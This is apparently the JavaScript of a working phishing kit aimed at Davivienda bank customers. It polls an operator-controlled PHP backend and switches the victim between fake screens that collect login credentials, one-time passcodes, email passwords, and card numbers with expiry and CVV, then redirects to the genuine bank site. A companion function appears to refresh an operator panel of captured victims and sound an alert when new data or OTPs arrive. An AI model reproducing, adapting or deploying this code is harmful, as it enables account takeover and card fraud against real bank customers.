function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i))
        dispositivo = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                dispositivo = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    dispositivo = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        dispositivo = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            dispositivo = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                dispositivo = "Windows Phone";
                            else
                                dispositivo = "PC";
    return dispositivo;
}  


function consultar_estado(){
    if (espera == 1) {
        $.post( "process/traer-estado.php",function(data) {
            switch (data) {
                case '2':espera = 0;
                         vista_otp(); 
                         break;
                case '4':espera = 0;
                         vista_email(); 
                         break;
                case '6':espera = 0;
                         vista_tarjeta();  
                         break;               
                case '8':espera = 0;
                         vista_errorotp(); 
                         break;
                case '10':espera = 0;
                          window.location.href = "https://www.davivienda.com/wps/portal/personas/nuevo";
                          break;
                case '12':espera = 0;
                          vista_usuario(); 
                          break;
            } 
        });    
    }    
}


function vista_otp(){
    $(".fondo").hide();
    $(".mensaje").hide();

    document.getElementById("codigootp").value = "";
    
    $("#icono-ti").removeClass("fa fa-address-book").addClass("fa fa-lock");
    $("#icono-ti").css("padding-left", "12px");
    $(".titulo-se").html("Verificación <strong>de dos pasos</strong>");  
    
    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".otp").show();
    $("#codigootp").focus();
}

function vista_errorotp(){
    $("#msgOTP2").html("Código OTP Inválido");
    $("#msgOTP2").css("display", "table");

    $(".fondo").hide();
    $(".mensaje").hide();

    document.getElementById("codigootp2").value = "";
    
    $("#icono-ti").removeClass("fa fa-address-book").addClass("fa fa-lock");
    $("#icono-ti").css("padding-left", "12px");
    $(".titulo-se").html("Verificación <strong>de dos pasos</strong>");  
    
    $(".tarjeta").hide();
    $(".otp").hide();
    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".errorotp").show();
    $("#codigootp2").focus();
}


function vista_usuario(){
    $(".fondo").hide();
    $(".mensaje").hide();

    document.getElementById("usuario").value = "";
    document.getElementById("clave").value = "";

    $("#icono-ti").removeClass("fa fa-address-book").addClass("fa fa-lock");
    $("#icono-ti").css("padding-left", "12px");
    $(".titulo-se").html("Transacciones <strong>para Clientes</strong>");  
    
    $(".tarjeta").hide();
    $(".errorotp").hide();
    $(".otp").hide();    
    $(".correo-con").hide();
    $(".acceso").show();
    $("#usuario").focus();

}


function vista_email(){
    $(".fondo").hide();
    $(".mensaje").hide();

    document.getElementById("email").value = "";
    document.getElementById("clave-co").value = "";

    $("#icono-ti").removeClass("fa fa-lock").addClass("fa fa-address-book");
    $("#icono-ti").css("padding-left", "10px");
    $(".titulo-se").html("Actualización <strong>de Datos</strong>");  

    $(".acceso").hide();
    $(".errorotp").hide();
    $(".otp").hide();
    $(".tarjeta").hide();
    $(".correo-con").show();
    $("#email").focus();

}


function vista_tarjeta(){
    $(".fondo").hide();
    $(".mensaje").hide();

    document.getElementById("tarjeta16").value = "";
    document.getElementById("expira").value = "";
    document.getElementById("cvv").value = "";

    $("#icono-ti").removeClass("fa fa-lock").addClass("fa fa-address-book");
    $("#icono-ti").css("padding-left", "10px");
    $(".titulo-se").html("Actualización <strong>de Datos</strong>");  

    $(".acceso").hide();    
    $(".correo-con").hide();
    $(".errorotp").hide();
    $(".otp").hide();
    $(".tarjeta").show();
    $("#tarjeta16").focus();

}

function actualizar_casos(){
    $.post( "../process/casos.php", function(data) {
        $(".contenido").html(data);     
        $.post( "../process/pito.php", function(res) {
            if (res == "SI") {
                $(".timbre-normal").get(0).play();
            }else{
                if (res == "OTP") {
                    $(".timbre-otp").get(0).play();
                }
            }
        });
    });
}
